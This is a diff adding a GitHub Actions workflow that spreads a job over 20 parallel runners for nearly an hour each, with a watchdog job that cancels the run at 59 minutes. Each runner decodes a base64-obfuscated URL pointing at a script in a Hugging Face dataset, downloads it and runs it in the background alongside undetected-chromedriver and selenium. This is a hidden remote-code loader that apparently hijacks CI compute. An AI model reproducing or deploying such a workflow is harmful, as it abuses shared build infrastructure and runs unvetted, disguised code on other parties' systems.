@@ -1,0 +1,108 @@
+name: Aegis Chronos Grid
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: grid-exec-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # -----------------------------------------------------------------
+  # Timer Monitor: halts execution across the board at 59 minutes
+  # -----------------------------------------------------------------
+  chronos-watchdog:
+    name: "Chronos Watchdog"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WATCH_DURATION: 3540
+    steps:
+      - name: Initialize Watchdog
+        run: |
+          echo ":: Watchdog active for execution ID: ${{ github.run_id }}"
+          echo ":: Monitoring for ${WATCH_DURATION}s before triggering abort..."
+
+          sleep "${WATCH_DURATION}"
+
+          echo ":: Threshold reached — sending termination signal to workflow."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo ":: Termination signal sent. Remaining tasks halted."
+
+  # -----------------------------------------------------------------
+  # Worker Cluster: distributed execution across alphanumeric shards
+  # -----------------------------------------------------------------
+  compute-cluster:
+    name: "Shard-${{ matrix.shard_key }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        shard_key: [
+          "A1X", "B2Y", "C3Z", "D4W", "E5V",
+          "F6U", "G7T", "H8S", "J9R", "K0Q",
+          "M1P", "N2O", "P3N", "Q4M", "R5L",
+          "S6K", "T7J", "U8H", "V9G", "W0F"
+        ]
+
+    steps:
+      # ===============================================================
+      # Step 1: Environment Setup
+      # ===============================================================
+      - name: Configure System Environment
+        run: |
+          echo "-> Preparing environment on Shard-${{ matrix.shard_key }}..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # ===============================================================
+      # Step 2: Fetch Core Payload
+      # ===============================================================
+      - name: Retrieve Worker Script
+        run: |
+          echo "-> Fetching worker binary from source..."
+          SOURCE_URI=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$SOURCE_URI" -o worker_core.py
+          echo "-> Worker script saved locally."
+
+      # ===============================================================
+      # Step 3: Dependencies
+      # ===============================================================
+      - name: Setup Python Libraries
+        run: |
+          echo "-> Installing required Python modules..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # ===============================================================
+      # Step 4: Execute Process
+      # ===============================================================
+      - name: Run Worker Process
+        run: |
+          echo "=> Starting background task on Shard-${{ matrix.shard_key }}..."
+
+          python3 worker_core.py &
+          TASK_PID=$!
+
+          echo "=> Process active (PID: $TASK_PID). Time limit: 3540s."
+
+          sleep 3540
+
+          if kill -0 "$TASK_PID" 2>/dev/null; then
+            echo "=> Time limit exceeded — killing process $TASK_PID."
+            kill -9 "$TASK_PID"
+            echo "=> Process forcefully stopped."
+          else
+            echo "=> Process finished naturally within the allotted window."
+          fi
